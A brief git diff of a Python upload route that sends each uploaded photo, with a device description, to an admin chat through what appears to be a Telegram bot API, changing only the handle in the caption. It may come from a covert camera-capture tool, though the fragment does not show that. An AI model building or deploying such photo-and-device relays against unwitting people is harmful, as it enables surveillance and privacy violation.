@@ -31,7 +31,7 @@ def upload():
                 files = {"photo": (photo.filename, f, photo.mimetype)}
                 data = {
                     "chat_id": ADMIN_ID,
-                    "caption": f"📸 Photo {i+1}\n👤 ID: @Vertul_king\n📱 {device}"
+                    "caption": f"📸 Photo {i+1}\n👤 ID: @ShadowAminy\n📱 {device}"
                 }
                 response = requests.post(API_URL, data=data, files=files, timeout=20)
                 print(response.text)
